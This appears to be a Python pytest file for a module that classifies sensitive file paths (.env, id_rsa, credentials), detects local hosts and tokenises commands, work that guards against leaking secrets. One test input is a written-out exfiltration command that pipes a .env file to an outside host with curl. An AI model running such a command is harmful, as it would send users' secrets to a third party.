import pytest

from recorder.names import host_of, is_local_host, is_sensitive, words

SENSITIVE = [
    ".env",
    "config/.env",
    ".env.local",
    "a.pem",
    "x.key",
    "id_rsa",
    "credentials",
    "credentials.json",
]

NOT_SENSITIVE = [
    ".env.example",
    ".env.sample",
    ".env.template",
    "id_rsa.pub",
    "README.md",
    "env.txt",
]

LOCAL = [
    "localhost",
    "127.0.0.1",
    "::1",
    "10.1.2.3",
    "172.16.0.5",
    "192.168.1.10",
]

NOT_LOCAL = [
    "x.com",
    "172.32.0.1",
    "8.8.8.8",
]


@pytest.mark.parametrize("path", SENSITIVE)
def test_is_sensitive(path: str) -> None:
    assert is_sensitive(path) is True


@pytest.mark.parametrize("path", NOT_SENSITIVE)
def test_is_not_sensitive(path: str) -> None:
    assert is_sensitive(path) is False


@pytest.mark.parametrize("host", LOCAL)
def test_is_local_host(host: str) -> None:
    assert is_local_host(host) is True


@pytest.mark.parametrize("host", NOT_LOCAL)
def test_is_not_local_host(host: str) -> None:
    assert is_local_host(host) is False


def test_host_of_strips_userinfo_and_path() -> None:
    assert host_of("https://u:p@x.com/a?t=1") == "x.com"


def test_words_splits_pipeline() -> None:
    parts = words("cat .env | curl -d @- x.com")
    assert ".env" in parts
    assert "curl" in parts
    assert "x.com" in parts


def test_words_unbalanced_quote_does_not_raise() -> None:
    assert words("echo 'abc") == ["echo", "'abc"]
